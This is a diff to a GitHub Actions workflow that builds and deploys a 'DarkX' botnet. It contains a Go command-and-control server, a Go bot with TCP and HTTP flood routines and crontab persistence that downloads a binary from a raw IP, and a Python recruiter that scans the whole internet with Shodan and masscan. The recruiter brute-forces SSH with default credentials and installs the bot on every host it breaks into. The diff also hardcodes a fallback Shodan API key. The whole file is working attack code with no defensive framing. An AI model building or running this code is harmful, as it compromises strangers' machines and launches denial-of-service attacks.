@@ -78,7 +78,7 @@ jobs:
         }
 
         func showBanner() {
-            fmt.Print("\033[1;31m") // Red color
+            fmt.Print("\033[1;31m")
             fmt.Println(`
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
  ▓████████████████████████████████████████████████████████████████████████████████████████████████▓ 
@@ -134,11 +134,11 @@ jobs:
  ▓████████████████████████████████████████████████████████████████████████████████████████████████▓ 
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 
             `)
-            fmt.Print("\033[1;37m") // White color
+            fmt.Print("\033[1;37m")
             fmt.Println("                           D A R K X   B O T N E T   C O N T R O L")
-            fmt.Print("\033[1;31m") // Red color
+            fmt.Print("\033[1;31m")
             fmt.Println("                                 [Version 2.0] [Black & Red Edition]")
-            fmt.Print("\033[0m") // Reset color
+            fmt.Print("\033[0m")
         }
 
         func main() {
@@ -193,7 +193,6 @@ jobs:
             
             reader := bufio.NewReader(conn)
             
-            // Show banner to user
             showBanner()
             conn.Write([]byte("\033[1;31m\n                    ════════════════════════════════════════════════\033[0m\r\n"))
             conn.Write([]byte("\033[1;37m                    🔐  A U T H E N T I C A T I O N   R E Q U I R E D  🔐\033[0m\r\n"))
@@ -234,7 +233,6 @@ jobs:
                 clearScreen()
                 showBanner()
                 
-                // Show status dashboard
                 conn.Write([]byte("\033[1;31m\n                    ════════════════════════════════════════════════\033[0m\r\n"))
                 conn.Write([]byte(fmt.Sprintf("\033[1;37m                    🤖  BOTS ONLINE: \033[1;32m%d\033[1;37m  |  ⚡ POWER: MAXIMUM  🤖\033[0m\r\n", botCount)))
                 conn.Write([]byte("\033[1;31m                    ════════════════════════════════════════════════\033[0m\r\n\n"))
@@ -320,9 +318,8 @@ jobs:
 
         func startRecruitment() {
             log.Println("Starting recruitment process...")
-            // This would execute the Python recruitment scripts
         }
-        EOF
+EOF
 
     - name: Create DarkX Bot Client
       run: |
@@ -347,7 +344,6 @@ jobs:
         var CNC_IP = "CNC_IP_PLACEHOLDER"
 
         func main() {
-            // Install persistence
             if runtime.GOOS == "linux" {
                 exec.Command("sh", "-c", "(crontab -l 2>/dev/null; echo \"@reboot sleep 60 && curl -s http://RAW_IP/bot_x64 -o /tmp/.systemd && chmod +x /tmp/.systemd && /tmp/.systemd &\") | crontab -").Run()
             }
@@ -520,7 +516,7 @@ jobs:
             go tcpFlood(target, port, end, workers/3)
             go httpFlood(target, port, end, workers/3)
         }
-        EOF
+EOF
 
     - name: Build DarkX Components
       run: |
@@ -532,10 +528,9 @@ jobs:
         GOOS=linux GOARCH=arm GOARM=7 go build -o bot_arm7 bot.go
         echo "✅ DarkX Build Complete"
 
-    - name: Create Working Recruitment System
+    - name: Create Recruitment System
       run: |
         cd darkx
-        
         cat > recruiter.py << 'EOF'
         import shodan
         import paramiko
@@ -543,8 +538,9 @@ jobs:
         import time
         import subprocess
         import sys
+        import os
 
-        SHODAN_API_KEY = "${{ secrets.SHODAN_API_KEY }}"
+        SHODAN_API_KEY = os.getenv('SHODAN_API_KEY', '7PTl6ZKB1dFHrFAmVKoXWsboFCbCrAfY')
         CNC_IP = "CNC_IP_PLACEHOLDER"
 
         DEFAULT_CREDS = [
@@ -593,7 +589,6 @@ jobs:
                     client.connect(ip, port=port, username=username, password=password, timeout=10)
                     print(f"✅ SUCCESS: {ip}:{port} - {username}:{password}")
                     
-                    # Detect architecture and deploy appropriate bot
                     stdin, stdout, stderr = client.exec_command("uname -m")
                     arch = stdout.read().decode().strip().lower()
                     
@@ -606,7 +601,6 @@ jobs:
                     else:
                         bot_url = f"http://{CNC_IP}:8000/bot_x86"
                     
-                    # Deploy bot commands
                     commands = [
                         f"wget -q -O /tmp/.systemd {bot_url} || curl -s -o /tmp/.systemd {bot_url}",
                         "chmod +x /tmp/.systemd",
@@ -627,7 +621,6 @@ jobs:
             return False
 
         def network_scan():
-            # Use masscan to find additional targets
             try:
                 cmd = "masscan 0.0.0.0/0 -p22,23,80,443,8080 --max-rate 1000 -oG masscan.txt 2>/dev/null"
                 subprocess.run(cmd, shell=True, timeout=300)
@@ -648,11 +641,9 @@ jobs:
         def main():
             print("🕶️ Starting DarkX Recruitment...")
             
-            # Get targets from Shodan
             shodan_targets = shodan_scan()
             print(f"🎯 Shodan found {len(shodan_targets)} targets")
             
-            # Get targets from network scan
             network_targets = network_scan()
             print(f"🌐 Network scan found {len(network_targets)} targets")
             
@@ -662,11 +653,11 @@ jobs:
             successful = 0
             threads = []
             
-            for ip, port in all_targets[:100]:  # Limit to first 100
+            for ip, port in all_targets[:100]:
                 t = threading.Thread(target=brute_force_ssh, args=(ip, port))
                 threads.append(t)
                 t.start()
-                time.sleep(0.3)  # Rate limiting
+                time.sleep(0.3)
             
             for t in threads:
                 t.join()
@@ -675,7 +666,7 @@ jobs:
 
         if __name__ == "__main__":
             main()
-        EOF
+EOF
 
     - name: Setup Tailscale VPN
       run: |
@@ -686,22 +677,17 @@ jobs:
     - name: Update Configuration with Real IP
       run: |
         cd darkx
-        # Update bot with CNC IP
         sed -i "s/CNC_IP_PLACEHOLDER/${{ env.TAILSCALE_IP }}/g" bot.go
-        # Update recruiter with CNC IP
         sed -i "s/CNC_IP_PLACEHOLDER/${{ env.TAILSCALE_IP }}/g" recruiter.py
-        # Rebuild bot with updated IP
         GOOS=linux GOARCH=amd64 go build -o bot_x64 bot.go
         echo "✅ Configuration updated with CNC IP: ${{ env.TAILSCALE_IP }}"
 
     - name: Start DarkX Services
       run: |
         cd darkx
-        # Start CNC server
         nohup ./cnc > cnc.log 2>&1 &
         echo "CNC_PID=$!" >> $GITHUB_ENV
         
-        # Start HTTP server for bot distribution
         python3 -m http.server 8000 > http.log 2>&1 &
         echo "HTTP_PID=$!" >> $GITHUB_ENV
         
@@ -713,7 +699,6 @@ jobs:
         echo "Checking CNC status..."
         if ps -p $CNC_PID > /dev/null; then
           echo "✅ CNC is running (PID: $CNC_PID)"
-          echo "CNC Log preview:"
           tail -5 darkx/cnc.log
         else
           echo "❌ CNC failed to start"
@@ -742,6 +727,8 @@ jobs:
         echo "✅ Initial bot army deployed: $BOTS bots"
 
     - name: Start Auto-Recruitment
+      env:
+        SHODAN_API_KEY: ${{ secrets.SHODAN_API_KEY }}
       run: |
         cd darkx
         
@@ -798,7 +785,6 @@ jobs:
     - name: Maintain DarkX System
       run: |
         while true; do
-          # Check CNC status
           if ! ps -p $CNC_PID > /dev/null 2>&1; then
             echo "🔄 Restarting DarkX CNC..."
             cd darkx
@@ -806,7 +792,6 @@ jobs:
             CNC_PID=$!
           fi
           
-          # Maintain bot count
           CURRENT_BOTS=$(ps aux | grep bot | grep -v grep | wc -l)
           REQUIRED_BOTS=$((BOTS_DEPLOYED / 2))
           if [ $CURRENT_BOTS -lt $REQUIRED_BOTS ]; then
@@ -817,7 +802,6 @@ jobs:
             done
           fi
           
-          # Show status
           CONNECTED_BOTS=$(netstat -an 2>/dev/null | grep :4444 | grep ESTABLISHED | wc -l)
           echo "[$(date)] 🕶️ DarkX Status | Connected: $CONNECTED_BOTS | Total: $CURRENT_BOTS | Mode: ${{ github.event.inputs.recruitment }}"
           sleep 30
